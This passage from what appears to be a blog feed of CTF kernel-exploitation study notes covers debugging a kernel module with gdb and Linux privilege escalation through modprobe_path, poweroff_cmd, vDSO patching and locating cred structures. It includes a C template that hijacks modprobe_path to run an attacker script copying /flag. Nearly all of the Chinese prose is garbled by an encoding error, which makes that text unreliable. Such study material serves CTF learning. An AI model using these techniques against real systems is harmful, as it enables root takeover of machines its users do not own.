class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç¬¦å·è¡¨åœ°å€ ç¬¬äºŒä¸ªå‚æ•°ä¸ºkernelåŸºå€</span> <br><span class="hljs-meta prompt_">#</span><span class="language-bash">åœ¨å¼€å¯kaslræ—¶ï¼ŒkernelåŸºå€ä¸å›ºå®šï¼Œå¯åœ¨qemuçš„-appendå‚æ•°ä¸­å¢æ·»â€˜kaslrâ€™</span><br></code></pre></td></tr></table></figure><p>åœ°å€å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨<code>cat /proc/modules</code>æŸ¥çœ‹</p><ul><li>è¿æ¥ç«¯å£</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">target remote 127.0.0.1:1234<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å…¶ä¸­ä¸‹å¥½æ–­ç‚¹ä¾¿å¯ä»¥å¼€å§‹è°ƒè¯•</p><p><img src="/img/article/kernelgdb/image-20230331205128408.png" alt="image-20230331205128408"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kernelã€‘ææƒå…¥é—¨-part2</title>
    <link href="/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part2/"/>
    <url>/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part2/</url>
    
    <content type="html"><![CDATA[<p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ”¹å˜ç‰¹æƒè¿›ç¨‹çš„æ‰§è¡Œè½¨è¿¹ï¼Œä¹Ÿå¯ä»¥å®ç°ææƒã€‚è¿™é‡Œæˆ‘ä»¬ä»ä»¥ä¸‹è§’åº¦æ¥è€ƒè™‘å¦‚ä½•æ”¹å˜ç‰¹æƒè¿›ç¨‹çš„æ‰§è¡Œè½¨è¿¹ã€‚</p><ul><li>æ”¹æ•°æ®</li><li>æ”¹ä»£ç </li></ul><h2 id="æ”¹æ•°æ®"><a href="#æ”¹æ•°æ®" class="headerlink" title="æ”¹æ•°æ®"></a>æ”¹æ•°æ®</h2><h3 id="ç¬¦å·é“¾æ¥"><a href="#ç¬¦å·é“¾æ¥" class="headerlink" title="ç¬¦å·é“¾æ¥"></a>ç¬¦å·é“¾æ¥</h3><p>å¦‚æœä¸€ä¸ª root æƒé™çš„è¿›ç¨‹ä¼šæ‰§è¡Œä¸€ä¸ªç¬¦å·é“¾æ¥çš„ç¨‹åºï¼Œå¹¶ä¸”è¯¥ç¬¦å·é“¾æ¥æˆ–è€…ç¬¦å·é“¾æ¥æŒ‡å‘çš„ç¨‹åºå¯ä»¥ç”±æ”»å‡»è€…æ§åˆ¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥å®ç°ææƒã€‚</p><h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p><code>call_usermodehelper</code> æ˜¯ä¸€ç§å†…æ ¸çº¿ç¨‹æ‰§è¡Œç”¨æˆ·æ€åº”ç”¨çš„æ–¹å¼ï¼Œå¹¶ä¸”å¯åŠ¨çš„è¿›ç¨‹å…·æœ‰ root æƒé™ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å…·ä½“è¦æ‰§è¡Œçš„åº”ç”¨ï¼Œé‚£å°±å¯ä»¥å®ç°ææƒã€‚åœ¨å†…æ ¸ä¸­ï¼Œ<code>call_usermodehelper</code> å…·ä½“è¦æ‰§è¡Œçš„åº”ç”¨å¾€å¾€æ˜¯ç”±æŸä¸ªå˜é‡æŒ‡å®šçš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹æ‰è¿™ä¸ªå˜é‡å³å¯ã€‚ä¸éš¾çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ç§å…¸å‹çš„æ•°æ®æµæ”»å‡»æ–¹æ³•ã€‚ä¸€èˆ¬å¸¸ç”¨çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ã€‚</p><h4 id="ä¿®æ”¹-modprobe-path"><a href="#ä¿®æ”¹-modprobe-path" class="headerlink" title="ä¿®æ”¹ modprobe_path"></a>ä¿®æ”¹ modprobe_path</h4><p>ä¿®æ”¹ <code>modprobe_path</code> å®ç°ææƒçš„åŸºæœ¬æµç¨‹å¦‚ä¸‹</p><ol><li><p>è·å– <code>modprobe_path</code> çš„åœ°å€ã€‚</p></li><li><p>ä¿®æ”¹ <code>modprobe_path</code> ä¸ºæŒ‡å®šçš„ç¨‹åºã€‚</p></li><li><p>è§¦å‘æ‰§è¡Œ<code>call_modprobe</code>ï¼Œä»è€Œå®ç°ææƒ ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹å‡ ç§æ–¹å¼æ¥è§¦å‘</p><ol><li>æ‰§è¡Œä¸€ä¸ªéæ³•çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚éæ³•çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦æ»¡è¶³ç›¸åº”çš„è¦æ±‚ï¼ˆå‚è€ƒ<code>call_usermodehelper</code> éƒ¨åˆ†çš„ä»‹ç»ï¼‰ã€‚</li></ol></li><li><p>ä½¿ç”¨æœªçŸ¥åè®®æ¥è§¦å‘ã€‚</p></li></ol><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿç»™å‡ºä½¿ç”¨ <code>modprobe_path</code> çš„æ¨¡æ¿ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// step 1. modify modprobe_path to the target value</span><br><br><span class="hljs-comment">// step 2. create related file</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);<br><br><span class="hljs-comment">// step 3. trigger it using unknown executable</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /home/pwn/dummy&quot;</span>);<br>system(<span class="hljs-string">&quot;/home/pwn/dummy&quot;</span>);<br><br><span class="hljs-comment">// step 3. trigger it using unknown protocol</span><br>socket(AF_INET,SOCK_STREAM,<span class="hljs-number">132</span>);<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç€é‡å…³æ³¨ä¸‹å¦‚ä½•å®šä½ <code>modprobe_path</code>ã€‚</p><h5 id="ç›´æ¥å®šä½"><a href="#ç›´æ¥å®šä½" class="headerlink" title="ç›´æ¥å®šä½"></a>ç›´æ¥å®šä½</h5><p>ç”±äº <code>modprobe_path</code> çš„å–å€¼æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰«æå†…å­˜ï¼Œå¯»æ‰¾å¯¹åº”çš„å­—ç¬¦ä¸²ã€‚è¿™éœ€è¦æˆ‘ä»¬å…·æœ‰æ‰«æå†…å­˜çš„èƒ½åŠ›ã€‚</p><h5 id="é—´æ¥å®šä½"><a href="#é—´æ¥å®šä½" class="headerlink" title="é—´æ¥å®šä½"></a>é—´æ¥å®šä½</h5><p>è€ƒè™‘åˆ° <code>modprobe_path</code> ç›¸å¯¹äºå†…æ ¸åŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè·å–åˆ°å†…æ ¸çš„åŸºåœ°å€ï¼Œç„¶åæ ¹æ®ç›¸å¯¹åç§»æ¥å¾—åˆ° <code>modprobe_path</code> çš„åœ°å€ã€‚</p><h4 id="ä¿®æ”¹-poweroff-cmd"><a href="#ä¿®æ”¹-poweroff-cmd" class="headerlink" title="ä¿®æ”¹ poweroff_cmd"></a>ä¿®æ”¹ poweroff_cmd</h4><ol><li>ä¿®æ”¹ <code>poweroff_cmd</code> ä¸ºæŒ‡å®šçš„ç¨‹åºã€‚</li><li>åŠ«æŒæ§åˆ¶æµæ‰§è¡Œ <code>__orderly_poweroff</code>ã€‚</li></ol><p>å…³äºå¦‚ä½•å®šä½ <code>poweroff_cmd</code>ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ç±»ä¼¼äºå®šä½ <code>modprobe_path</code> çš„æ–¹æ³•ã€‚</p><h2 id="æ”¹ä»£ç "><a href="#æ”¹ä»£ç " class="headerlink" title="æ”¹ä»£ç "></a>æ”¹ä»£ç </h2><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ root æƒé™è¿›ç¨‹æ‰§è¡Œçš„ä»£ç ï¼Œé‚£å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥å®ç°ææƒã€‚</p><h3 id="ä¿®æ”¹-vDSO-ä»£ç "><a href="#ä¿®æ”¹-vDSO-ä»£ç " class="headerlink" title="ä¿®æ”¹ vDSO ä»£ç "></a>ä¿®æ”¹ vDSO ä»£ç </h3><p>å†…æ ¸ä¸­ vDSO çš„ä»£ç ä¼šè¢«æ˜ å°„åˆ°æ‰€æœ‰çš„ç”¨æˆ·æ€è¿›ç¨‹ä¸­ã€‚å¦‚æœæœ‰ä¸€ä¸ªé«˜ç‰¹æƒçš„è¿›ç¨‹ä¼šå‘¨æœŸæ€§åœ°è°ƒç”¨ vDSO ä¸­çš„å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘æŠŠ vDSO ä¸­ç›¸åº”çš„å‡½æ•°ä¿®æ”¹ä¸ºç‰¹å®šçš„ shellcodeã€‚å½“é«˜æƒé™çš„è¿›ç¨‹æ‰§è¡Œç›¸åº”çš„ä»£ç æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œææƒã€‚</p><p>åœ¨æ—©æœŸçš„æ—¶å€™ï¼ŒLinux ä¸­çš„ vDSO æ˜¯å¯å†™çš„ï¼Œè€ƒè™‘åˆ°è¿™æ ·çš„é£é™©ï¼ŒKees Cook æå‡ºå¼•å…¥ <code>post-init read-only</code> çš„æ•°æ®ï¼Œå³å°†é‚£äº›åˆå§‹åŒ–åä¸å†è¢«å†™çš„æ•°æ®æ ‡è®°ä¸ºåªè¯»ï¼Œæ¥é˜²å¾¡è¿™æ ·çš„åˆ©ç”¨ã€‚</p><p>åœ¨å¼•å…¥ä¹‹å‰ï¼ŒvDSO å¯¹åº”çš„ raw_data åªæ˜¯æ ‡è®°äº†å¯¹é½å±æ€§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile,<br>    <span class="hljs-string">&quot;static unsigned char raw_data[%lu] __page_aligned_data = &#123;&quot;</span>,<br>    mapping_size);<br></code></pre></td></tr></table></figure><p>å¼•å…¥ä¹‹åï¼ŒvDSO å¯¹åº”çš„ raw_data åˆ™è¢«æ ‡è®°ä¸ºäº†åˆå§‹åŒ–ååªè¯»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile,<br>    <span class="hljs-string">&quot;static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = &#123;&quot;</span>,<br>    mapping_size);<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¿®æ”¹ vDSO è¿›è¡Œææƒçš„åŸºæœ¬æ–¹å¼å¦‚ä¸‹</p><ul><li>å®šä½ vDSO</li><li>ä¿®æ”¹ vDSO çš„ç‰¹å®šå‡½æ•°ä¸ºæŒ‡å®šçš„ shellcode</li><li>ç­‰å¾…è§¦å‘æ‰§è¡Œ shellcode</li></ul><p>è¿™é‡Œæˆ‘ä»¬ç€é‡å…³æ³¨ä¸‹å¦‚ä½•å®šä½ vDSOã€‚</p><h4 id="IDA-é‡Œå®šä½"><a href="#IDA-é‡Œå®šä½" class="headerlink" title="IDA é‡Œå®šä½"></a>IDA é‡Œå®šä½</h4><p>è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹å¦‚ä½•åœ¨ vmlinux ä¸­æ‰¾åˆ° vDSO çš„ä½ç½®ã€‚</p><ol><li>åœ¨ IDA é‡Œå®šä½ <code>init_vdso</code> å‡½æ•°çš„åœ°å€</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">init_vdso</span><span class="hljs-params">()</span><br>&#123;<br>  init_vdso_image(&amp;vdso_image_64 + <span class="hljs-number">0x20000000</span>);<br>  init_vdso_image(&amp;vdso_image_x32 + <span class="hljs-number">0x20000000</span>);<br>  cpu_maps_update_begin();<br>  on_each_cpu((<span class="hljs-type">char</span> *)startup_64 + <span class="hljs-number">0x100003EA0</span>LL, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>);<br>  _register_cpu_notifier(&amp;sdata + <span class="hljs-number">536882764</span>);<br>  cpu_maps_update_done();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>å¯ä»¥çœ‹åˆ° <code>vdso_image_64</code> å’Œ <code>vdso_image_x32</code>ã€‚ä»¥<code>vdso_image_64</code> ä¸ºä¾‹ï¼Œç‚¹åˆ°è¯¥å˜é‡çš„åœ°å€</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rodata:FFFFFFFF81A01300                 public vdso_image_64<br>.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18â†‘o<br>.rodata:FFFFFFFF81A01300                                         ; init_vdso+1â†“o<br></code></pre></td></tr></table></figure><ol><li>ç‚¹å‡» <code>raw_data</code> å³å¯çŸ¥é“ 64 ä½ vDSO åœ¨å†…æ ¸é•œåƒä¸­çš„åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒvDSO ç¡®å®æ˜¯ä»¥é¡µå¯¹é½çš„ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data:FFFFFFFF81E04000 raw_data        db  7Fh ;              ; DATA XREF: .rodata:vdso_image_64â†‘o<br>.data:FFFFFFFF81E04001                 db  45h ; E<br>.data:FFFFFFFF81E04002                 db  4Ch ; L<br>.data:FFFFFFFF81E04003                 db  46h ; F<br></code></pre></td></tr></table></figure><p>ä»æœ€åçš„ç¬¦å·æ¥çœ‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>raw_data</code> æ¥å¯»æ‰¾ vDSOã€‚</p><h4 id="å†…å­˜ä¸­å®šä½"><a href="#å†…å­˜ä¸­å®šä½" class="headerlink" title="å†…å­˜ä¸­å®šä½"></a>å†…å­˜ä¸­å®šä½</h4><h5 id="ç›´æ¥å®šä½-1"><a href="#ç›´æ¥å®šä½-1" class="headerlink" title="ç›´æ¥å®šä½"></a>ç›´æ¥å®šä½</h5><p>vDSO å…¶å®æ˜¯ä¸€ä¸ª ELF æ–‡ä»¶ï¼Œå…·æœ‰ ELF æ–‡ä»¶å¤´ã€‚åŒæ—¶ï¼ŒvDSO ä¸­ç‰¹å®šä½ç½®å­˜å‚¨ç€å¯¼å‡ºå‡½æ•°çš„å­—ç¬¦ä¸²ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸¤ä¸ªç‰¹å¾æ¥æ‰«æå†…å­˜ï¼Œå®šä½ vDSO çš„ä½ç½®ã€‚</p><h5 id="é—´æ¥å®šä½-1"><a href="#é—´æ¥å®šä½-1" class="headerlink" title="é—´æ¥å®šä½"></a>é—´æ¥å®šä½</h5><p>è€ƒè™‘åˆ° vDSO ç›¸å¯¹äºå†…æ ¸åŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè·å–åˆ°å†…æ ¸çš„åŸºåœ°å€ï¼Œç„¶åæ ¹æ®ç›¸å¯¹åç§»æ¥å¾—åˆ° vDSO çš„åœ°å€ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kernelã€‘ææƒå…¥é—¨-part1</title>
    <link href="/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part1/"/>
    <url>/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>çº ç»“äº†å¾ˆä¹…ï¼Œå†³å®šè¿˜æ˜¯å¼€å¯è¿™ä¸ªæ¨¡å—çš„å­¦ä¹ ï¼Œåœ¨è¿™ä¸ªè·¯å£è¿·èŒ«äº†å¾ˆä¹…äº†ï¼Œä¸€ç›´æ²¡æœ‰å†³å®šå¥½èµ°å‘ä½•å¤„ã€‚è™½ç„¶æœ‰å¯èƒ½ä¼šèµ°é”™è·¯ï¼Œå¯èƒ½ä¼šå­¦ä¹ å¾ˆå¤šçœ‹èµ·æ¥æ²¡ç”¨çš„ä¸œè¥¿ï¼Œä½†å¸Œæœ›Kernelçš„å­¦ä¹ èƒ½å¤Ÿå¸¦æˆ‘åˆšå¼€å§‹æ¥è§¦PWNæ—¶çš„ä¹è¶£ã€‚å°†ä¼šä¸»è¦å€ŸåŠ©CTF wikiå’Œã€Šä»0åˆ°1ã€‹</p></blockquote><h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><p>å†…æ ¸ä¼šé€šè¿‡è¿›ç¨‹çš„ <code>task_struct</code> ç»“æ„ä½“ä¸­çš„ <code>cred</code> æŒ‡é’ˆæ¥ç´¢å¼• <code>cred</code> ç»“æ„ä½“ï¼Œç„¶åæ ¹æ® <code>cred</code> çš„å†…å®¹æ¥åˆ¤æ–­ä¸€ä¸ªè¿›ç¨‹æ‹¥æœ‰çš„æƒé™ï¼Œå¦‚æœ <code>cred</code> ç»“æ„ä½“æˆå‘˜ä¸­çš„ <strong>uid-fsgid</strong> éƒ½ä¸º 0ï¼Œé‚£ä¸€èˆ¬å°±ä¼šè®¤ä¸ºè¿›ç¨‹å…·æœ‰ <strong>root</strong> æƒé™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¾ˆè‡ªç„¶å°±èƒ½æƒ³åˆ°ä¸¤ç§æ€è·¯æ¥è¿›è¡Œææƒï¼š</p><ul><li>ç›´æ¥ä¿®æ”¹ <code>cred</code> ç»“æ„ä½“çš„å†…å®¹</li><li>ä¿®æ”¹ <code>task_struct</code> ç»“æ„ä½“ä¸­çš„ cred æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ cred</li></ul><h2 id="ç›´æ¥å®šä½"><a href="#ç›´æ¥å®šä½" class="headerlink" title="ç›´æ¥å®šä½"></a>ç›´æ¥å®šä½</h2><p>cred ç»“æ„ä½“çš„æœ€å‰é¢è®°å½•äº†å„ç§ id ä¿¡æ¯ï¼Œå¯¹äºä¸€ä¸ªæ™®é€šçš„è¿›ç¨‹è€Œè¨€ï¼Œ<code>uid-fsgid</code> éƒ½æ˜¯æ‰§è¡Œè¿›ç¨‹çš„ç”¨æˆ·çš„èº«ä»½ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰«æå†…å­˜æ¥å®šä½ credã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åœ¨å®é™…å®šä½çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°å¾ˆå¤šæ»¡è¶³è¦æ±‚çš„ credï¼Œè¿™ä¸»è¦æ˜¯å› ä¸º cred ç»“æ„ä½“å¯èƒ½ä¼šè¢«æ‹·è´ã€é‡Šæ”¾ã€‚</strong>ä¸€ä¸ªå¾ˆç›´è§‚çš„æƒ³æ³•æ˜¯åœ¨å®šä½çš„è¿‡ç¨‹ä¸­ï¼Œåˆ©ç”¨ usage ä¸ä¸º 0 æ¥ç­›é™¤æ‰ä¸€äº› credï¼Œä½†ä»ç„¶ä¼šå‘ç°ä¸€äº› usage ä¸º 0 çš„ credã€‚è¿™æ˜¯å› ä¸º cred ä» usage ä¸º 0ï¼Œ åˆ°é‡Šæ”¾æœ‰ä¸€å®šçš„æ—¶é—´ã€‚æ­¤å¤–ï¼Œcred æ˜¯ä½¿ç”¨ rcu å»¶è¿Ÿé‡Šæ”¾çš„ã€‚</p><h2 id="é—´æ¥å®šä½"><a href="#é—´æ¥å®šä½" class="headerlink" title="é—´æ¥å®šä½"></a>é—´æ¥å®šä½</h2><h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><p>è¿›ç¨‹çš„ <code>task_struct</code> ç»“æ„ä½“ä¸­ä¼šå­˜æ”¾æŒ‡å‘ cred çš„æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥</p><ol><li>å®šä½å½“å‰è¿›ç¨‹ <code>task_struct</code> ç»“æ„ä½“çš„åœ°å€</li><li>æ ¹æ® cred æŒ‡é’ˆç›¸å¯¹äº task_struct ç»“æ„ä½“çš„åç§»è®¡ç®—å¾—å‡º <code>cred</code> æŒ‡é’ˆå­˜å‚¨çš„åœ°å€</li><li>è·å– <code>cred</code> å…·ä½“çš„åœ°å€</li></ol><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><p>comm ç”¨æ¥æ ‡è®°å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼Œä½äºè¿›ç¨‹çš„ <code>task_struct</code> ç»“æ„ä½“ä¸­ã€‚æˆ‘ä»¬å¯ä»¥å‘ç° comm å…¶å®åœ¨ cred çš„æ­£ä¸‹æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆå®šä½ comm ï¼Œç„¶åå®šä½ cred çš„åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 